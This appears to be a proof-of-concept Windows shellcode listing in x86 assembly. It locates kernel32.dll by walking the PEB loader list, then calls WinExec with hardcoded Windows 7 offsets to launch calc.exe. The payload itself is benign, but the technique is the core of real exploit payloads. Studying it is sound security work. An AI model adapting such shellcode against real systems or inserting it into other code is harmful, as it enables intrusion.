[BITS 32]
;[get kernel32 address]
xor ebx, ebx          ;clear ebx
mov ebx, [fs:0x30]    ;get pointer to PEB
mov ecx, [ebx+0xA4]   ;get OSMajorVersion
mov ebx, [ebx+0x0C]   ;get PEB->Ldr
mov ebx, [ebx+0x14]   ;get PEB->Ldr->InMemoryOrderModuleList.Flink (1st entry)
mov ebx, [ebx]        ;get 2nd entry
mov ebx, [ebx]        ;get 3rd entry
mov ebx, [ebx+0x10]   ;get base address of 3rd entry = kernel32.dll
 
;[push the winexec calc params]
xor esi,esi           ;zero register for param use
push esi              ;null terminator for "calc"
push dword "calc"     ;"calc"
mov eax,esp           ;pointer to calc
push esi              ;param 1 = 0
push eax              ;param 2 = "calc"

lea edi,[ebx+0x5214f] ;win 7 kernel32.exitprocess()
lea eax,[ebx+0x8e5fd] ;win 7 kernel32.winexec()
 
;[execute winexec/exitprocess]
WinExec:
push edi              ;return address = exitprocess
jmp eax               ;jump to winexec()

